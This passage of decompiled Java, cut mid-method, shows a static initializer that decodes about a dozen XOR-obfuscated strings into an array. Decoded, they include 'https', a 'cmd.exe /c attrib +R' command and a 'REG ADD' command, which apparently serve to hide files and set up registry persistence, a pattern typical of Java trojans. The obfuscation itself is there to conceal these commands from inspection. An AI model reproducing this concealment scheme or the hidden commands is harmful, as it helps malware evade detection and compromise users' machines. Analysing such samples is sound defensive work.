                        case 3: {
                            c40 = 't';
                            break;
                        }
                        default: {
                            c40 = '\u000f';
                            break;
                        }
                    }
                    charArray20[length20] = (char)(c39 ^ c40);
                    ++n80;
                } while (n78 == 0);
            }
            if (n78 > n80) {
                continue;
            }
            break;
        }
        z2[n77] = new String(charArray20).intern();
        final int n81 = 20;
        final char[] charArray21 = "r\u000fM\u0011".toCharArray();
        int length21;
        int n83;
        final int n82 = n83 = (length21 = charArray21.length);
        int n84 = 0;
        while (true) {
            Label_2478: {
                if (n82 > 1) {
                    break Label_2478;
                }
                length21 = (n83 = n84);
                do {
                    final char c41 = charArray21[n83];
                    char c42 = '\0';
                    switch (n84 % 5) {
                        case 0: {
                            c42 = '\u0014';
                            break;
                        }
                        case 1: {
                            c42 = 'f';
                            break;
                        }
                        case 2: {
                            c42 = '!';
                            break;
                        }
                        case 3: {
                            c42 = 't';
                            break;
                        }
                        default: {
                            c42 = '\u000f';
                            break;
                        }
                    }
                    charArray21[length21] = (char)(c41 ^ c42);
                    ++n84;
                } while (n82 == 0);
            }
            if (n82 > n84) {
                continue;
            }
            break;
        }
        z2[n81] = new String(charArray21).intern();
        final int n85 = 21;
        final char[] charArray22 = ":\fO\u0015au".toCharArray();
        int length22;
        int n87;
        final int n86 = n87 = (length22 = charArray22.length);
        int n88 = 0;
        while (true) {
            Label_2598: {
                if (n86 > 1) {
                    break Label_2598;
                }
                length22 = (n87 = n88);
                do {
                    final char c43 = charArray22[n87];
                    char c44 = '\0';
                    switch (n88 % 5) {
                        case 0: {
                            c44 = '\u0014';
                            break;
                        }
                        case 1: {
                            c44 = 'f';
                            break;
                        }
                        case 2: {
                            c44 = '!';
                            break;
                        }
                        case 3: {
                            c44 = 't';
                            break;
                        }
                        default: {
                            c44 = '\u000f';
                            break;
                        }
                    }
                    charArray22[length22] = (char)(c43 ^ c44);
                    ++n88;
                } while (n86 == 0);
            }
            if (n86 > n88) {
                continue;
            }
            break;
        }
        z2[n85] = new String(charArray22).intern();
        final int n89 = 22;
        final char[] charArray23 = "|\u0012U\u0004|".toCharArray();
        int length23;
        int n91;
        final int n90 = n91 = (length23 = charArray23.length);
        int n92 = 0;
        while (true) {
            Label_2718: {
                if (n90 > 1) {
                    break Label_2718;
                }
                length23 = (n91 = n92);
                do {
                    final char c45 = charArray23[n91];
                    char c46 = '\0';
                    switch (n92 % 5) {
                        case 0: {
                            c46 = '\u0014';
                            break;
                        }
                        case 1: {
                            c46 = 'f';
                            break;
                        }
                        case 2: {
                            c46 = '!';
                            break;
                        }
                        case 3: {
                            c46 = 't';
                            break;
                        }
                        default: {
                            c46 = '\u000f';
                            break;
                        }
                    }
                    charArray23[length23] = (char)(c45 ^ c46);
                    ++n92;
                } while (n90 == 0);
            }
            if (n90 > n92) {
                continue;
            }
            break;
        }
        z2[n89] = new String(charArray23).intern();
        final int n93 = 23;
        final char[] charArray24 = "H\fO\u0015auHU\u0007nHD\u0003T r".toCharArray();
        int length24;
        int n95;
        final int n94 = n95 = (length24 = charArray24.length);
        int n96 = 0;
        while (true) {
            Label_2838: {
                if (n94 > 1) {
                    break Label_2838;
                }
                length24 = (n95 = n96);
                do {
                    final char c47 = charArray24[n95];
                    char c48 = '\0';
                    switch (n96 % 5) {
                        case 0: {
                            c48 = '\u0014';
                            break;
                        }
                        case 1: {
                            c48 = 'f';
                            break;
                        }
                        case 2: {
                            c48 = '!';
                            break;
                        }
                        case 3: {
                            c48 = 't';
                            break;
                        }
                        default: {
                            c48 = '\u000f';
                            break;
                        }
                    }
                    charArray24[length24] = (char)(c47 ^ c48);
                    ++n96;
                } while (n94 == 0);
            }
            if (n94 > n96) {
                continue;
            }
            break;
        }
        z2[n93] = new String(charArray24).intern();
        final int n97 = 24;
        final char[] charArray25 = "w\u000bEZjl\u0003\u0001[l4\u0007U\u0000}}\u0004\u0001_]4M`T$GF\n</6".toCharArray();
        int length25;
        int n99;
        final int n98 = n99 = (length25 = charArray25.length);
        int n100 = 0;
        while (true) {
            Label_2958: {
                if (n98 > 1) {
                    break Label_2958;
                }
                length25 = (n99 = n100);
                do {
                    final char c49 = charArray25[n99];
                    char c50 = '\0';
                    switch (n100 % 5) {
                        case 0: {
                            c50 = '\u0014';
                            break;
                        }
                        case 1: {
                            c50 = 'f';
                            break;
                        }
                        case 2: {
                            c50 = '!';
                            break;
                        }
                        case 3: {
                            c50 = 't';
                            break;
                        }
                        default: {
                            c50 = '\u000f';
                            break;
                        }
                    }
                    charArray25[length25] = (char)(c49 ^ c50);
                    ++n100;
                } while (n98 == 0);
            }
            if (n98 > n100) {
                continue;
            }
            break;
        }
        z2[n97] = new String(charArray25).intern();
        final int n101 = 25;
        final char[] charArray26 = "F#fTNP\"\u0001<DW3}'`r\u0012V\u0015}q:l\u001dlf\tR\u001bi`:v\u001dap\tV\u0007SW\u0013S\u0006jz\u0012w\u0011}g\u000fN\u001aSF\u0013OT bFL\u0007eu\u0010@\u0010cxF\u000e\u0000/F#f+\\NF\u000e\u0010/6\f@\u0002ncF\f\u001enfF}V".toCharArray();
        int length26;
        int n103;
        final int n102 = n103 = (length26 = charArray26.length);
        int n104 = 0;
        while (true) {
            Label_3078: {
                if (n102 > 1) {
                    break Label_3078;
                }
                length26 = (n103 = n104);
                do {
                    final char c51 = charArray26[n103];
                    char c52 = '\0';
                    switch (n104 % 5) {
                        case 0: {
                            c52 = '\u0014';
                            break;
                        }
                        case 1: {
                            c52 = 'f';
                            break;
                        }
                        case 2: {
                            c52 = '!';
                            break;
                        }
                        case 3: {
                            c52 = 't';
                            break;
                        }
                        default: {
                            c52 = '\u000f';
                            break;
                        }
                    }
                    charArray26[length26] = (char)(c51 ^ c52);
                    ++n104;
                } while (n102 == 0);
            }
            if (n102 > n104) {
                continue;
            }
            break;
        }
        z2[n101] = new String(charArray26).intern();
        final int n105 = 26;
        final char[] charArray27 = "~\b@\u001an:\u0012R\u0015".toCharArray();
        int length27;
        int n107;
        final int n106 = n107 = (length27 = charArray27.length);
        int n108 = 0;
        while (true) {
            Label_3198: {
                if (n106 > 1) {
                    break Label_3198;
                }
                length27 = (n107 = n108);
                do {
                    final char c53 = charArray27[n107];
                    char c54 = '\0';
                    switch (n108 % 5) {
                        case 0: {
                            c54 = '\u0014';
                            break;
                        }
                        case 1: {
                            c54 = 'f';
                            break;
                        }
                        case 2: {
                            c54 = '!';
                            break;
                        }
                        case 3: {
                            c54 = 't';
                            break;
                        }
                        default: {
                            c54 = '\u000f';
                            break;
                        }
                    }
                    charArray27[length27] = (char)(c53 ^ c54);
                    ++n108;
                } while (n106 == 0);
            }
            if (n106 > n108) {
                continue;
            }
            break;
        }
        z2[n105] = new String(charArray27).intern();
        final int n109 = 27;
        final char[] charArray28 = "{\u0015\u000f\u001any\u0003".toCharArray();
        int length28;
        int n111;
        final int n110 = n111 = (length28 = charArray28.length);
        int n112 = 0;
        while (true) {
            Label_3318: {
                if (n110 > 1) {
                    break Label_3318;
                }
                length28 = (n111 = n112);
                do {
                    final char c55 = charArray28[n111];
                    char c56 = '\0';
                    switch (n112 % 5) {
                        case 0: {
                            c56 = '\u0014';
                            break;
                        }
                        case 1: {
                            c56 = 'f';
                            break;
                        }
                        case 2: {
                            c56 = '!';
                            break;
                        }
                        case 3: {
                            c56 = 't';
                            break;
                        }
                        default: {
                            c56 = '\u000f';
                            break;
                        }
                    }
                    charArray28[length28] = (char)(c55 ^ c56);
                    ++n112;
                } while (n110 == 0);
            }
            if (n110 > n112) {
                continue;
            }
            break;
        }
        z2[n109] = new String(charArray28).intern();
        final int n113 = 28;
        final char[] charArray29 = ";\u0004H\u001a ~\u0007W\u0015".toCharArray();
        int length29;
        int n115;
        final int n114 = n115 = (length29 = charArray29.length);
        int n116 = 0;
        while (true) {
            Label_3438: {
                if (n114 > 1) {
                    break Label_3438;
                }
                length29 = (n115 = n116);
                do {
                    final char c57 = charArray29[n115];
                    char c58 = '\0';
                    switch (n116 % 5) {
                        case 0: {
                            c58 = '\u0014';
                            break;
                        }
                        case 1: {
                            c58 = 'f';
                            break;
                        }
                        case 2: {
                            c58 = '!';
                            break;
                        }
                        case 3: {
                            c58 = 't';
                            break;
                        }
                        default: {
                            c58 = '\u000f';
                            break;
                        }
                    }
                    charArray29[length29] = (char)(c57 ^ c58);
                    ++n116;
                } while (n114 == 0);
            }
            if (n114 > n116) {
                continue;
            }
            break;
        }
        z2[n113] = new String(charArray29).intern();
        final int n117 = 29;
        final char[] charArray30 = "Q\u0014S\u001b}4\nN\u0015k}\bFTfy\u0007F\u0011|5".toCharArray();
        int length30;
        int n119;
        final int n118 = n119 = (length30 = charArray30.length);
        int n120 = 0;
        while (true) {
            Label_3558: {
                if (n118 > 1) {
                    break Label_3558;
                }
                length30 = (n119 = n120);
                do {
                    final char c59 = charArray30[n119];
                    char c60 = '\0';
                    switch (n120 % 5) {
                        case 0: {
                            c60 = '\u0014';
                            break;
                        }
                        case 1: {
                            c60 = 'f';
                            break;
                        }
                        case 2: {
                            c60 = '!';
                            break;
                        }
                        case 3: {
                            c60 = 't';
                            break;
                        }
                        default: {
                            c60 = '\u000f';
                            break;
                        }
                    }
                    charArray30[length30] = (char)(c59 ^ c60);
                    ++n120;
                } while (n118 == 0);
            }
            if (n118 > n120) {
                continue;
            }
            break;
        }
        z2[n117] = new String(charArray30).intern();
        final int n121 = 30;
        final char[] charArray31 = "Z\tO\u0011/{\u0000\u0001\u0000gmFC\u0001|}\bD\u0007|".toCharArray();
        int length31;
        int n123;
        final int n122 = n123 = (length31 = charArray31.length);
        int n124 = 0;
        while (true) {
            Label_3678: {
                if (n122 > 1) {
                    break Label_3678;
                }
                length31 = (n123 = n124);
                do {
                    final char c61 = charArray31[n123];
                    char c62 = '\0';
                    switch (n124 % 5) {
                        case 0: {
                            c62 = '\u0014';
                            break;
                        }
                        case 1: {
                            c62 = 'f';
                            break;
                        }
                        case 2: {
                            c62 = '!';
                            break;
                        }
                        case 3: {
                            c62 = 't';
                            break;
                        }
                        default: {
                            c62 = '\u000f';
                            break;
                        }
                    }
                    charArray31[length31] = (char)(c61 ^ c62);
                    ++n124;
                } while (n122 == 0);
            }
            if (n122 <= n124) {
                z2[n121] = new String(charArray31).intern();
                z = z2;
                return;
            }
            continue;
        }
    }
}
